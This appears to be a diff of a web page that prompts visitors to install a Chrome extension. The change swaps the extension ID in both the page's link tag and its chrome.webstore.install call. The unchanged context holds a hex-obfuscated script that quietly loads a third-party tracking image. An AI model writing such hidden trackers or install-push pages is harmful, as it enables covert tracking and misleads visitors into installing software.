@@ -16,7 +16,7 @@
   <meta name="referrer" content="origin">
   <script>var _0x5e07=["\x73\x72\x63","\x2F\x2F\x77\x68\x6F\x73\x2E\x61\x6D\x75\x6E\x67\x2E\x75\x73\x2F\x77\x69\x64\x67\x65\x74\x2F\x70\x63\x70\x63\x64\x69\x74\x69\x31\x2E\x70\x6E\x67"]; new Image()[_0x5e07[0]]= _0x5e07[1]</script>
 
-  <link rel="chrome-webstore-item" href="https://chrome.google.com/webstore/detail/joljjhjdcmcknkngeibglbahgdckeepe">
+  <link rel="chrome-webstore-item" href="https://chrome.google.com/webstore/detail/bibehaajfpibjbobeeockcgehhnlihma">
   <style type="text/css">
     #alertbox{
       width: 366px;
@@ -356,7 +356,7 @@
           },500);
           $("#alert").hide();
           chrome.webstore.install(
-              'https://chrome.google.com/webstore/detail/joljjhjdcmcknkngeibglbahgdckeepe',
+              'https://chrome.google.com/webstore/detail/bibehaajfpibjbobeeockcgehhnlihma',
               function() {
               var dax = new Image();
 
